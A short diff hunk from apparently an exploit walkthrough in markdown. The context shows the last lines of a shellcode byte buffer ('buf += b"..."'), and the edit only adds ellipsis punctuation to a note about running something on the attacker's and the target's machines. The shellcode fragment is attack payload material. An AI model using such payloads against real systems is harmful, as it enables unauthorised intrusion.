@@ -792,4 +792,4 @@ buf += b"\x90\xa9\x6a\xa3\xa4\x2d\x8b\x33\xdc\x45\xe4\x52"
 buf += b"\x4f\xfc\xfa\xc3\xdc\x77\x1b\x26\x62"
 ```
 
-Have to do on 2 machines, your's and the targets.
+Have to do on 2 machines, your's and the targets...
